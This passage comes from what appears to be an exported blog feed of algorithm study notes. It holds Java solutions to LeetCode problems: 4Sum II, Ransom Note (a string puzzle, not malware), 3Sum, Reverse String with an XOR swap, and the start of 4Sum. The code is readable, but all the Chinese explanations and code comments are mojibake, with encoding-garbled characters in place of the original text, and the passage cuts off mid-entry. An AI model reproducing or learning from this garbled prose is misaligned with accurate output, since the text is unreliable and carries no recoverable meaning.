title="å››æ•°ä¹‹å’Œ"></a>å››æ•°ä¹‹å’Œ</h4><p>linkï¼š<a href="https://leetcode.cn/problems/4sum-ii/description/">454. å››æ•°ç›¸åŠ  II - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>é¦–å…ˆçœ‹åˆ°å››æ•°åŠ å’Œï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä¸¤ä¸¤åˆ†ç»„éå†åˆ†åˆ«æ±‚å’Œ.åˆ©ç”¨mapä¸­keyå’Œvalueåˆ†åˆ«å­˜å‚¨ä¸¤ä¸ªæ•°ç»„å…ƒç´ ä¹‹å’Œä»¥åŠå‡ºç°çš„æ¬¡æ•°ï¼ˆvalueï¼‰æœ€ååˆ©ç”¨ä¸¤ä¸¤æ‰“è¶³æ±‚å’Œä¹‹ååŠ æ³•åŸåˆ™a+bï¼ˆAï¼‰+ c+dï¼ˆBï¼‰&#x3D; 0ï¼Œ0 - B &#x3D; Aï¼Œå¦‚æœAåœ¨mapä¸­å‡ºç°è¿‡ï¼Œå°±ç”¨å®šä¹‰çš„è®¡æ•°å™¨countå§mapä¸­keyå¯¹åº”çš„valueç»Ÿè®¡å‡ºæ¥æœ€åè¿”å›countå³å¯.ã€å‡ºç°è¿‡å‡ æ¬¡å°±æœ‰å‡ ç»„ã€‘</p><h6 id="HashMap-1"><a href="#HashMap-1" class="headerlink" title="HashMap"></a>HashMap</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">       <span class="comment">//é¦–å…ˆåˆ›å»ºéœ€è¦çš„Map</span></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//åˆ›å»ºsumå’Œres</span></span><br><span class="line">        <span class="type">int</span> sum,res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//æ±‚aã€b(A)æ•°ç»„ä¹‹å’Œ</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j : nums2)&#123;</span><br><span class="line">                sum = i + j;</span><br><span class="line">                <span class="comment">//å¦‚æœtmpå·²ç»åœ¨mapä¸­å­˜å‚¨è¿‡ value+1æ›´æ–°å­˜å‚¨</span></span><br><span class="line">                <span class="comment">//putå­˜å‚¨é”®å€¼å¯¹ getè·å–valueå€¼</span></span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(sum)) &#123;</span><br><span class="line">                    map.put(sum,map.get(sum) + <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//ç¬¬ä¸€æ¬¡å‡ºç°åœ¨mapä¸­valueä¸º1</span></span><br><span class="line">                    map.put(sum,<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//æ±‚cã€d(B)ä¸¤æ•°ç»„ä¹‹å’Œå¹¶æ ¹æ®é€»è¾‘å…¬å¼æ£€æŸ¥Aæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨å¯¹åº”æ•°å€¼</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums3) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j : nums4)&#123;</span><br><span class="line">                sum = i + j;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(<span class="number">0</span> - sum)) &#123;</span><br><span class="line">                    res += map.get(<span class="number">0</span> - sum);</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="è¡¥å……getOrDefault"><a href="#è¡¥å……getOrDefault" class="headerlink" title="è¡¥å……getOrDefault()"></a>è¡¥å……getOrDefault()</h6><p>getOrDefault() æ–¹æ³•è·å–æŒ‡å®š key å¯¹åº”å¯¹ valueï¼Œå¦‚æœæ‰¾ä¸åˆ° key ï¼Œåˆ™è¿”å›è®¾ç½®çš„é»˜è®¤å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashmap.getOrDefault(Object key, V defaultValue)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j:nums2)</span><br><span class="line">            &#123;</span><br><span class="line">                sum = i+j;</span><br><span class="line">                map.put(sum,map.getOrDefault(sum,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums3)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j :nums4)</span><br><span class="line">            &#123;</span><br><span class="line">               sum = i + j;</span><br><span class="line">               res+=map.getOrDefault(<span class="number">0</span>-sum,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0xa</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xa/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xa/</url>
      
        <content type="html"><![CDATA[<h4 id="èµé‡‘ä¿¡"><a href="#èµé‡‘ä¿¡" class="headerlink" title="èµé‡‘ä¿¡"></a>èµé‡‘ä¿¡</h4><p>linkï¼š<a href="https://leetcode.cn/problems/ransom-note/description/">383. èµé‡‘ä¿¡ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å…³é”®åˆ†æè§‰å¾—æ˜¯æ¬¡æ•°ç»Ÿè®¡ï¼ŒransomNoteä¸­çš„å­—ç¬¦å‡ºç°æ¬¡æ•°å’Œmagazineä¸­ç»Ÿè®¡æ¬¡æ•°ç›¸åŒå³å¯.ï¼ˆæœ‰ç‚¹ç›¸åŒå­—æ¯å¼‚åºè¯çš„å‘³-&gt;å“ˆå¸Œæ•°ç»„å®ç°ã€å¤§å°å†™è½¬æ¢ã€‘ï¼‰<br>é¢˜ç›®åˆè¯´æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²å…¨ä¸ºå°å†™å­—æ¯ï¼Œæœ‰æ•°é‡é™åˆ¶ï¼ˆå°‘é‡ï¼‰.æ–¹ä¾¿è¿›è¡Œæ˜ å°„.<br>å¯ä»¥æš´åŠ›ä¸¤å±‚forå¾ªç¯æ±‚è§£ï¼Œä½†åˆæƒ³åˆ°å…ˆå‰æ¥è§¦çš„å“ˆå¸Œmapè¿›è¡Œæ˜ å°„.</p><h6 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a><strong>Tip</strong></h6><p>æœ¬é¢˜ç›®ä½¿ç”¨mapæ¶ˆè€—çš„ç©ºé—´èµ„æºæ¯”æ•°ç»„å¤§ä¸€äº›.mapè¦ç»´æŠ¤çº¢é»‘æ ‘æˆ–å“ˆå¸Œè¡¨è¿˜è¦åšå“ˆå¸Œå‡½æ•°ï¼Œæ›´è´¹æ—¶.ã€æ•°æ®é‡å¤§æ—¶æ›´èƒ½ä½“ç°ã€‘</p><h6 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConstruct</span><span class="params">(String ransomNote, String magazine)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºéœ€è¦çš„æ•°ç»„å’Œä¸­é—´æ±´æ¢</span></span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//éå†rans åœ¨magazineä¸­æ˜ å°„ç¡®å®š ä¸‹æ ‡ä½ç½®æ ‡è®°é€å¢</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; magazine.length(); i++) &#123;</span><br><span class="line">            tmp = magazine.charAt(i) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            arr[tmp]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åœ¨magazineä¸­å¯¹åº”æŸ¥æ‰¾ æ‰¾çš„çš„ä½ç½®é€å‡</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ;i &lt; ransomNote.length(); i++) &#123;</span><br><span class="line">            tmp = ransomNote.charAt(i) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="comment">//æ³¨æ„æƒ…å†µåˆ¤æ–­</span></span><br><span class="line">            <span class="keyword">if</span>(arr[tmp] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                arr[tmp]--;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸‰æ•°ä¹‹å’Œ"><a href="#ä¸‰æ•°ä¹‹å’Œ" class="headerlink" title="ä¸‰æ•°ä¹‹å’Œ"></a>ä¸‰æ•°ä¹‹å’Œ</h4><p>linkï¼š<a href="https://leetcode.cn/problems/3sum/description/">15. ä¸‰æ•°ä¹‹å’Œ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>æœ€å…ˆæƒ³çš„æ˜¯ä¸¤ä¸¤åˆ†ç»„ï¼Œç”¨æ•°ç»„åšï¼Œç„¶ååˆæƒ³åˆ°ç”¨å“ˆå¸Œmapæ˜ å°„ï¼Œä½†æ˜¯é¢˜ç›®é™åˆ¶äº†å»é‡ï¼Œä¸æ˜¯å¾ˆå¥½æ“ä½œ.<br>æ ¹æ®æä¾›çš„ç¤ºä¾‹å‘ç°åªæ˜¯ä¸‰å…ƒç»„ä¸èƒ½é‡å¤ä½†æ˜¯ç»„å†…å…ƒç´ å¯ä»¥ç›¸åŒå¦‚[0,0,0].è¿™ç§æƒ…å†µåœ¨å»é‡çš„æ—¶å€™è¦è€ƒè™‘è¿›å».é¿å…å¯¹{-2ï¼Œ-2ï¼Œ4}è¿™æ ·çš„æ•°æ®ç­›æŸ¥é—æ¼.<br><strong>æ‰€ä»¥åˆ¤æ–­æ¡ä»¶æ˜¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] ==  nums[i - <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><strong>è€Œä¸æ˜¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[i] == nums[i + <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>ç”¨åŒæŒ‡é’ˆè¿›è¡Œåˆ¤æ–­ã€å¿…é¡»æ˜¯æ•°ç»„æ’å¥½åºã€‘ï¼Œiåœ¨æ•°ç»„èµ·å§‹ä½ç½®ï¼Œleftåœ¨i+1ä½ç½®ï¼Œrightåœ¨æ•°ç»„æœ«å°¾.iå’Œrightå…ˆä¸åŠ¨ï¼Œleftä¾æ¬¡å‘åéå†ï¼Œå¦‚æœä¸‰è€…ç›¸åŠ å¤§äº0ï¼Œrightå‘å‰ç§»åŠ¨.ä¸‰æŠ˜ç›¸åŠ å°äº0ï¼Œleftå¾€åç§»åŠ¨.</p><h6 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip"></a>Tip</h6><p>ä¸‰æ•°å»é‡ç¢°åˆ°ç›¸é‚»ç›¸åŒå…ƒç´ è¿›è¡Œè·³è¿‡ï¼Œå› ä¸ºå·²ç»åˆ¤æ–­è¿‡ä¸€æ¬¡æ²¡å¿…è¦å†åˆ¤æ–­ä¸€æ¬¡ï¼Œè¿˜è¦è¿›è¡Œå‡æé¿å…è¶…æ—¶.</p><h6 id="åŒæŒ‡é’ˆ"><a href="#åŒæŒ‡é’ˆ" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºéœ€è¦çš„æœ‰åºåˆ—è¡¨</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">       <span class="comment">//è¿›è¡Œéå†åˆ¤æ–­ å…¨å¤§äº0ä¸å¯èƒ½åŠ å’Œä¸º0</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//å»é‡aã€b</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i -<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line"> <span class="comment">//åŒæŒ‡é’ˆ</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(right &gt; left) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">        <span class="keyword">if</span>(sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.add(Arrays.asList(nums[i],nums[left],nums[right]));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//å»é‡bã€cä¿©å…ƒç´ </span></span><br><span class="line">            <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>])&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//å¯»æ‰¾æ–°çš„ä¸‰å…ƒç»„é¿å…é‡å¤</span></span><br><span class="line">            right--;</span><br><span class="line">            left++;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0xb</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xb/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xb/</url>
      
        <content type="html"><![CDATA[<h4 id="åè½¬å­—ç¬¦ä¸²"><a href="#åè½¬å­—ç¬¦ä¸²" class="headerlink" title="åè½¬å­—ç¬¦ä¸²"></a>åè½¬å­—ç¬¦ä¸²</h4><p>linkï¼š<a href="https://leetcode.cn/problems/reverse-string/description/">344. åè½¬å­—ç¬¦ä¸² - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å…¶å®æœ€å¼€å§‹å­¦Cè¯­è¨€çš„æ—¶å€™ï¼Œä¹Ÿé‡åˆ°è¿‡ç±»ä¼¼é¢˜ç›®.å½“æ—¶è‡ªä»¥ä¸ºçš„æŠ•æœºå–å·§æ— éåªæ˜¯å€’åºæ‰“å°è€Œä¸æ˜¯é€†ç½®å…ƒç´ .ï¼ˆhh æœç„¶å°ç™½éƒ½ä¼šè¿™æ · å½“ç„¶ä¹Ÿæœ‰æ›´èªæ˜çš„å°æ‡’ç‹—ç›´æ¥ç”¨åº“å‡½æ•° ã€åŠå…¶ä¸æ¨èã€‘</p><h6 id="åŒæŒ‡é’ˆ"><a href="#åŒæŒ‡é’ˆ" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">          <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> s[left];</span><br><span class="line">          s[left] = s[right];</span><br><span class="line">          s[right] = tmp;</span><br><span class="line">          right--;</span><br><span class="line">          left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tip</strong></p><p>æ›´ä¼˜é›…çš„å¤„ç†æ–¹å¼â€”â€”<strong>å¼‚æˆ–</strong><br>å› ä¸ºa ^ a &#x3D; 0,b ^ 0 &#x3D;b<br>æ‰€ä»¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">          s[left] ^= s[right];</span><br><span class="line">          s[right] ^= s[left];</span><br><span class="line">          s[left] ^= s[right];</span><br><span class="line">          right--;</span><br><span class="line">          left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€æ­¥</strong>ï¼š <code>s[left] ^= s[right];</code></p><ul><li>ç”¨ <code>s[left]</code> ä¸ <code>s[right]</code> è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ <code>s[left]</code> ä¸­ã€‚</li><li>æ­¤æ—¶ <code>s[left]</code> çš„å€¼å˜ä¸º <code>A ^ B</code>ï¼Œè€Œ <code>s[right]</code> ä»ç„¶æ˜¯ <code>B</code>ã€‚</li></ul><p><strong>ç¬¬äºŒæ­¥</strong>ï¼š <code>s[right] ^= s[left];</code></p><ul><li>å°† <code>s[right]</code> ä¸æ›´æ–°åçš„ <code>s[left]</code> è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ <code>s[right]</code> ä¸­ã€‚</li><li>å› ä¸º <code>s[left]</code> æ˜¯ <code>A ^ B</code>ï¼Œæ‰€ä»¥ <code>s[right] ^= (A ^ B)</code> ç›¸å½“äº <code>B ^ (A ^ B)</code>ã€‚</li><li>ç”±äº <code>B ^ B = 0</code> å’Œ <code>0 ^ A = A</code>ï¼Œæ­¤æ—¶ <code>s[right]</code> çš„å€¼å˜ä¸º <code>A</code>ã€‚</li></ul><p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼š <code>s[left] ^= s[right];</code></p><ul><li>å°† <code>s[left]</code> ä¸æ›´æ–°åçš„ <code>s[right]</code> è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ <code>s[left]</code> ä¸­ã€‚</li><li>å› ä¸º <code>s[right]</code> æ˜¯ <code>A</code>ï¼Œæ‰€ä»¥ <code>s[left] ^= A</code> ç›¸å½“äº <code>(A ^ B) ^ A</code>ã€‚</li><li>ç”±äº <code>A ^ A = 0</code> å’Œ <code>0 ^ B = B</code>ï¼Œæ­¤æ—¶ <code>s[left]</code> çš„å€¼å˜ä¸º <code>B</code>ã€‚</li></ul><h4 id="å››æ•°ä¹‹å’Œ"><a href="#å››æ•°ä¹‹å’Œ" class="headerlink" title="å››æ•°ä¹‹å’Œ"></a>å››æ•°ä¹‹å’Œ</h4><p>linkï¼š<a href="https://leetcode.cn/problems/4sum/description/">18. å››æ•°ä¹‹å’Œ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>æœ¬é¢˜å¤§è‡´æ€è·¯å’Œä¸‰æ•°ä¹‹å’ŒåŸºæœ¬ä¸€è‡´ï¼Œåªä¸è¿‡é¢˜ç›®ç»™å‡ºå››ä¸ªæ•°å­—éƒ½äº’ä¸ç›¸åŒä¸”targetæ˜¯è¾“å…¥çš„å¹¶é0.<br>åœ¨ä¸‰æ•°ä¹‹å’Œçš„åŸºç¡€å•ç‹¬åµŒå¥—forå¾ªç¯å³å¯.<br>**æ³¨æ„ **</p><p>å½“æ•°ç»„é¦–å…ƒç´ å¤§äº0å¹¶ä¸”iä¸‹æ ‡ä½ç½®çš„valueå¤§äºtargetçš„æ—¶å€™å°±å¯ä»¥ç›´æ¥pass.<br>å› ä¸ºå½“targetä¸ºè´Ÿæ•°ä½†é¦–å…ƒç´ æ¯”targetå¤§æ—¶å°±å¯èƒ½ä¼šå¿½ç•¥å€¼.<br>ä¾‹ï¼štarget &#x3D; -6 ä½†nums[0] &#x3D; -5<br>å¦‚æœæŒ‰ç…§ä¸‰æ•°ä¹‹å’Œçš„å»é‡æ¡ä»¶ä¼šä¸ç¬¦åˆé¢„æœŸã€å› ä¸ºä¸‰æ•°ä¹‹å’Œæ±‚è§£çš„targetæ˜¯0 å…ƒç´ éƒ½å¤§äº0 é‚£ä¸‰æ•°åŠ å’Œè‡ªç„¶ä¸ä¼šä¸º0ã€‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) </span><br></pre></td></tr></table></figure><p>å»é‡açš„é€»è¾‘ç›¸åŒ ä¸ºäº†é¿å…[1,1,2]è¿™ç§æƒ…å†µ åˆ¤æ–­ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == 